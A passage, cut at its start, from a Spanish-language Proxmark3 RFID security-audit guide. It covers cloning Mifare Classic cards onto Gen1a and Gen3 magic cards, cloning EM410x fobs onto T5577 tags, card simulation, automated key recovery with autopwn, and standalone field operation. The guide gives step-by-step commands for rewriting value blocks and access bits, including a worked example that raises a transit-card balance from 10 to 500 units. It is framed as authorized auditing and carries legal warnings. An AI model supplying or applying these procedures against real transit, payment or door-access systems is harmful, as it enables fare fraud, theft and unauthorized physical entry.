hf mf cwipe -u A29558E4 -a 0004 -s 08
# Para 4K:
hf mf cwipe -u A29558E4 -a 0044 -s 18

# 3. Cargar el dump en la tarjeta usando comandos Gen1a
hf mf cload -f hf-mf-A29558E4-dump.bin

# 4. Establecer el UID (si no se estableció con cload)
hf mf csetuid -u A29558E4 -a 0004 -s 08

# 5. Verificar la clonación
hf mf info
hf mf dump --1k
```

**Comandos Gen1A disponibles:**

| Comando | Función |
|---------|----------|
| `hf mf csetuid` | Establecer UID en tarjeta Gen1a |
| `hf mf cwipe` | Limpiar tarjeta a valores por defecto |
| `hf mf csetblk` | Escribir bloque individual vía backdoor |
| `hf mf cgetblk` | Leer bloque individual vía backdoor |
| `hf mf cgetsc` | Leer sector completo vía backdoor |
| `hf mf cload` | Cargar dump completo en tarjeta |
| `hf mf csave` | Guardar contenido de tarjeta |
| `hf mf cview` | Visualizar contenido de tarjeta |

##### Método 3: Clonación con Tarjetas Gen3 (APDU)

Las tarjetas Gen3 utilizan comandos APDU estándar, haciéndolas compatibles con Android:

```bash
# Cambiar solo el UID (recomendado para Gen3)
hf mf gen3uid -u A29558E4

# O escribir el bloque 0 completo
hf mf gen3blk -d A29558E4440804006263646566676869

# ADVERTENCIA: Bloquear permanentemente (irreversible)
# hf mf gen3freeze
```

**Advertencias Críticas:**

⚠️ **Tarjetas Gen1A:**
- Son fácilmente detectables por sistemas de seguridad modernos
- Algunos lectores ejecutan el comando de detección `40(7)` automáticamente
- NO recomendadas para entornos con medidas anti-clonación activas

⚠️ **Tarjetas Gen2:**
- Más difíciles de detectar que Gen1A
- Algunos sistemas pueden detectarlas mediante pruebas de escritura directa al bloque 0
- El ATQA y SAK pueden variar según el fabricante

⚠️ **Configuración de ATQA/SAK:**
- Debe coincidir **exactamente** con la tarjeta original
- ATQA incorrecto puede causar que la tarjeta no sea reconocida
- SAK incorrecto puede revelar que es una tarjeta mágica

⚠️ **Recuperación de Tarjeta "Bricked":**

Si una tarjeta Gen2 no responde después de escribir datos incorrectos en el bloque 0:

```bash
# Forzar configuración de anticollision
hf 14a config --atqa force --bcc ignore --cl2 skip --rats skip

# Escribir bloque 0 correcto
# Para 1K:
hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344440804006263646566676869 --force
# Para 4K:
hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344441802006263646566676869 --force

# Restaurar configuración estándar
hf 14a config --std
hf 14a reader
```

### 3.2. Manipulación de Datos

Más allá de la clonación 1:1, la verdadera amenaza para muchos sistemas reside en la capacidad de un atacante para alterar datos específicos dentro de la tarjeta. En sistemas que almacenan saldos, permisos o contadores, la manipulación de datos puede tener un impacto directo, como aumentar el crédito en una tarjeta de transporte o cambiar los niveles de acceso.

#### Proceso de Manipulación de Datos

##### Paso 1: Obtener y Convertir el Volcado

Dependiendo del formato del archivo de volcado, puede ser necesario convertirlo para facilitar la edición:

**Formatos de archivo disponibles:**

| Formato | Extensión | Descripción | Uso |
|---------|-----------|-------------|-----|
| Binario | `.bin` | Datos crudos de la tarjeta | Herramientas hex, scripts |
| Emulador | `.eml` | Formato de texto legible | Edición manual fácil |
| JSON | `.json` | Estructura de datos completa | Scripts, análisis automatizado |

**Conversión entre formatos:**

```bash
# Convertir .bin a .eml (más fácil de editar)
script run data_mf_bin2eml -i hf-mf-A29558E4-dump.bin -o modified.eml

# Convertir .eml de vuelta a .bin después de editar
script run data_mf_eml2bin -i modified.eml -o modified.bin
```

##### Paso 2: Editar el Volcado

**Método 1: Edición Hexadecimal (Binario)**

1. Abrir el archivo `.bin` en un editor hexadecimal (HxD, Bless, hexedit, etc.)
2. Localizar los bytes específicos a modificar:
   - **Bloques de valor**: Bloques configurados para almacenar saldo (formato especial de 4 bytes duplicados)
   - **Bloques de datos**: Información de usuario (permisos, identificadores, etc.)
   - **Sector trailers**: Claves y bits de acceso (bloques 3, 7, 11, etc.)

**Estructura de un bloque de valor Mifare Classic:**

```
Byte:    0  1  2  3  |  4  5  6  7  |  8  9 10 11 | 12 13 14 15
Datos: [Valor (LSB)] [~Valor     ] [Valor      ] [Addr][~Addr][Addr][~Addr]
```

Ejemplo de saldo de 100 unidades (0x00000064) en bloque 4:
```
64 00 00 00  9B FF FF FF  64 00 00 00  04 FB 04 FB
```

**Método 2: Edición de Texto (EML)**

El formato `.eml` muestra cada bloque como una línea de 32 caracteres hexadecimales:

```
# Ejemplo: hf-mf-modified.eml
A29558E4440804006263646566676869  <- Bloque 0 (UID + Manufacturer)
00000000000000000000000000000000  <- Bloque 1 (datos)
00000000000000000000000000000000  <- Bloque 2 (datos)
FFFFFFFFFFFF787788C1FFFFFFFFFFFF  <- Bloque 3 (sector trailer)
64000000 9BFFFFFF 64000000 04FB04FB  <- Bloque 4 (bloque de valor: 100 unidades)
...
```

**Herramientas de edición:**

```bash
# Editar manualmente con editor de texto
nano modified.eml

# O usar herramientas específicas de Proxmark3
hf mf eview -f hf-mf-A29558E4-dump.eml  # Visualizar contenido
```

##### Paso 3: Escribir los Datos Modificados

**Opción A: Restauración Completa**

```bash
# Restaurar desde archivo binario modificado
hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin

# Restaurar desde archivo EML (convertir primero a .bin)
script run data_mf_eml2bin -i modified.eml -o modified.bin
hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin
```

**Opción B: Escritura Selectiva de Bloques**

Para modificar solo bloques específicos sin sobrescribir toda la tarjeta:

```bash
# Escribir un bloque individual (requiere clave válida)
hf mf wrbl --blk 4 -a -k FFFFFFFFFFFF -d 64000000 9BFFFFFF 64000000 04FB04FB

# Para tarjetas Gen1a (usando backdoor, sin necesidad de clave)
hf mf csetblk --blk 4 -d 64000000 9BFFFFFF 64000000 04FB04FB
```

**Opción C: Manipulación de Bloques de Valor**

Los bloques de valor tienen comandos especiales para incrementar/decrementar:

```bash
# Ver información de bloques de valor
hf mf value -h

# Incrementar un bloque de valor
hf mf value --blk 4 -a -k FFFFFFFFFFFF --inc 100

# Decrementar un bloque de valor
hf mf value --blk 4 -a -k FFFFFFFFFFFF --dec 50

# Restaurar desde bloque de respaldo
hf mf value --blk 4 -a -k FFFFFFFFFFFF --res
```

##### Paso 4: Verificación de Cambios

```bash
# Leer y verificar el bloque modificado
hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF

# Verificar bloque de valor específicamente
hf mf value --blk 4 -a -k FFFFFFFFFFFF

# Dump completo para comparar
hf mf dump --1k -f verification.bin
```

#### Ejemplos Prácticos de Manipulación

**Caso 1: Modificar Saldo en Tarjeta de Transporte**

```bash
# 1. Obtener dump original
hf mf autopwn

# 2. Identificar bloque de saldo (ejemplo: bloque 4)
hf mf view -f hf-mf-<UID>-dump.bin

# 3. Convertir a EML para edición
script run data_mf_bin2eml -i hf-mf-<UID>-dump.bin

# 4. Editar bloque 4 en el archivo .eml
# Cambiar saldo de 10 a 500 unidades
# Original: 0A000000 F5FFFFFF 0A000000 04FB04FB
# Modificado: F4010000 0BFEFFFF F4010000 04FB04FB (500 en hex = 0x1F4)

# 5. Convertir de vuelta a .bin
script run data_mf_eml2bin -i hf-mf-<UID>-dump.eml -o modified.bin

# 6. Restaurar en tarjeta mágica
hf mf restore --1k -f modified.bin -k hf-mf-<UID>-key.bin
```

**Caso 2: Cambiar Permisos de Acceso**

```bash
# Modificar bits de acceso para permitir escritura en bloques de datos
# ADVERTENCIA: Bits de acceso incorrectos pueden bloquear la tarjeta permanentemente

# Ejemplo de sector trailer con acceso modificado
# Bloque 7 (trailer del sector 1):
# FFFFFFFFFFFF 787788 C1 FFFFFFFFFFFF
#              ^^^^^^ ^^  <- Access bits y GPB

# Para cambiar a permisos más permisivos (FF 07 80):
hf mf wrbl --blk 7 -b -k FFFFFFFFFFFF -d FFFFFFFFFFFFF00780 80 FFFFFFFFFFFF
```

**Advertencias Críticas:**

⚠️ **Bits de Acceso:**
- Los bits de acceso controlan qué claves pueden leer/escribir cada bloque
- Configuración incorrecta puede **bloquear permanentemente** el sector
- Siempre verificar con `hf mf acl -d <hex>` antes de escribir
- NO modificar bits de acceso sin comprender completamente su funcionamiento

⚠️ **Bloques de Valor:**
- Deben mantener el formato especial: Valor, ~Valor, Valor, Addr
- El formato es validado por hardware en algunos lectores
- Valores inconsistentes pueden ser rechazados o causar errores

⚠️ **Sector Trailers:**
- NUNCA modificar el sector trailer (bloque 3, 7, 11, etc.) sin backup
- Perder las claves significa perder acceso permanente al sector
- La clave B puede estar oculta (no legible) dependiendo de los bits de acceso

⚠️ **Aspectos Legales:**
- La manipulación de tarjetas de pago, transporte o acceso ajenas es **ilegal**
- Solo realizar en auditorías autorizadas o con sistemas propios
- Documentar todos los cambios para el informe de auditoría

Una vez que la tarjeta ha sido clonada o sus datos han sido manipulados, el siguiente paso es validar su funcionamiento en un entorno real o mediante simulación.

## 4. Pruebas Reales y Simulación

### 4.1. Simulación de Tarjetas

La simulación es una capacidad táctica extremadamente valiosa del Proxmark3. Permite emular el comportamiento de una tarjeta RFID sin necesidad de tener una tarjeta física clonada. Esto convierte al Proxmark3 en una herramienta de auditoría de campo muy versátil, ya que el propio dispositivo puede actuar como la credencial, permitiendo al auditor probar un sistema de acceso con solo llevar el Proxmark3.

El procedimiento para simular tarjetas varía según la frecuencia:

#### Simulación de Alta Frecuencia (HF)

El Proxmark3 puede emular una tarjeta Mifare Classic completa utilizando como fuente un archivo de volcado de memoria previamente obtenido.

El comando para iniciar la simulación es:

```bash
hf mf sim --uid <UID> --atqa <ATQA> --sak <SAK> --eml <archivo.eml>
```

#### Simulación de Baja Frecuencia (LF)

Para etiquetas LF más simples, como las de tipo EM410x, que solo transmiten un ID, se puede simular la etiqueta directamente a partir de su identificador leído.

El comando para esta simulación es:

```bash
lf em 410x sim --id <ID>
```

### 4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)

Aunque el concepto de clonación es similar al de HF, el procedimiento para etiquetas de Baja Frecuencia (LF) es diferente y utiliza comandos específicos. Las etiquetas LF, como los llaveros de acceso comunes (tipo EM410x), suelen ser más simples y solo transmiten un ID.

El proceso para clonar una etiqueta de acceso LF en una etiqueta virgen reescribible T5577 es el siguiente:

#### 1. Leer la etiqueta original

Coloca el llavero o tarjeta LF original en la antena LF del Proxmark3 y ejecuta el comando de lectura:

```bash
lf em 410x reader
```

El Proxmark3 mostrará el ID de la etiqueta, por ejemplo: `EM410x ID 1234567890`.

#### 2. Escribir en la etiqueta virgen

Retira la etiqueta original y coloca una etiqueta T5577 virgen en la antena LF.

Ejecuta el comando de escritura, utilizando el ID leído en el paso anterior:

```bash
lf em 410x clone --id 1234567890
```

### 4.3. Pruebas de Acceso Físico

El objetivo final de una auditoría de control de acceso es verificar si un sistema físico real es vulnerable. La clonación y simulación de credenciales son los medios para alcanzar este fin.

El procedimiento de validación final consiste en:

Una vez que se ha clonado una tarjeta física o se está simulando una credencial con el Proxmark3, el último paso es presentar el dispositivo (la tarjeta clonada o el Proxmark3 en modo simulación) al lector del sistema objetivo (p. ej., una cerradura de puerta de oficina, un torno de metro, etc.).

Un resultado exitoso, como la apertura de la cerradura o la validación del acceso, confirma de manera inequívoca que el sistema es vulnerable a ataques de clonación, proporcionando una evidencia tangible del riesgo de seguridad.

Tras completar las pruebas manuales, es útil conocer herramientas que pueden automatizar y acelerar estos procesos para auditorías más eficientes.

## 5. Herramientas Avanzadas y Automatización

### 5.1. Acelerando el Proceso de Auditoría

En un escenario de auditoría real, la eficiencia es un factor clave. Mientras que los comandos manuales son excelentes para el aprendizaje y el análisis detallado, las herramientas de automatización permiten al analista pasar de ataques puntuales a evaluaciones rápidas y completas de un sistema.

A continuación se describen dos comandos avanzados para acelerar el proceso de auditoría de tarjetas Mifare Classic:

#### Diagnósticos Rápidos con fchck

El comando `hf mf fchk` (fast check) se utiliza para verificar rápidamente si una clave candidata es válida para un sector específico. Es significativamente más rápido que intentar una lectura completa del bloque, ya que solo realiza el proceso de autenticación. Es especialmente útil para probar rápidamente una clave de un diccionario sin tener que realizar una lectura de datos.

```bash
hf mf fchk --blk <número_bloque> --key <clave>
```

#### Automatización Completa con autopwn

Como se ha mencionado, `hf mf autopwn` es el comando de automatización por excelencia para Mifare Classic.

Su función es ejecutar de forma secuencial y automática un conjunto completo de ataques conocidos (ataque de diccionario, darkside, nested). Su objetivo es recuperar todas las claves de todos los sectores de la tarjeta de la manera más eficiente posible, generando al final los archivos de volcado (`.bin`) y de claves para su uso inmediato.

```bash
hf mf autopwn
```

### 5.2. Modo de Operación Autónomo (Standalone)

La capacidad de operar en modo standalone transforma al Proxmark3 de una herramienta de laboratorio, dependiente de un PC, a un dispositivo de campo autónomo. Esta funcionalidad es ideal para escenarios de red teaming o auditorías físicas discretas, donde llevar un ordenador portátil no es práctico. Permite realizar operaciones de lectura, simulación o clonación sin estar conectado a un cliente.

A continuación se describe cómo funciona y se configura el modo standalone en un Proxmark3 Easy:

#### Activación del Modo Standalone

Para activar el modo, se mantiene presionado el botón físico del dispositivo durante aproximadamente 2 segundos.

#### Secuencia de Operaciones

Una vez en modo autónomo, las pulsaciones cortas del botón activan diferentes funciones en una secuencia predefinida. El ciclo típico para etiquetas LF HID es el siguiente:

- **Pulsación #1**: El dispositivo busca una etiqueta LF HID para leerla y almacenarla en la memoria "verde".
- **Pulsación #2**: El Proxmark3 simula la etiqueta HID leída de la memoria "verde".
- **Pulsación #3**: El dispositivo escribe la etiqueta almacenada en memoria "verde" a una tarjeta virgen.
- **Pulsación #4**: El dispositivo clona la etiqueta HID leída en una tarjeta virgen T5577.
- **Pulsación #5**: Busca una segunda etiqueta LF HID para leerla y almacenarla en la memoria "azul".
- El ciclo continúa con la simulación y clonación de la etiqueta en la memoria "azul".

---

## Conclusión

Esta guía proporciona una base técnica sólida para realizar auditorías de seguridad de tarjetas RFID/NFC utilizando el Proxmark3. Desde la configuración inicial del firmware hasta la clonación y manipulación de tarjetas, cada fase del proceso ha sido diseñada para seguir una metodología profesional y sistemática.

Es fundamental recordar que estas técnicas deben utilizarse exclusivamente en contextos legales y éticos, como auditorías de seguridad autorizadas o investigaciones académicas. El conocimiento de estas vulnerabilidades es esencial para mejorar la seguridad de los sistemas de control de acceso y proteger infraestructuras críticas.
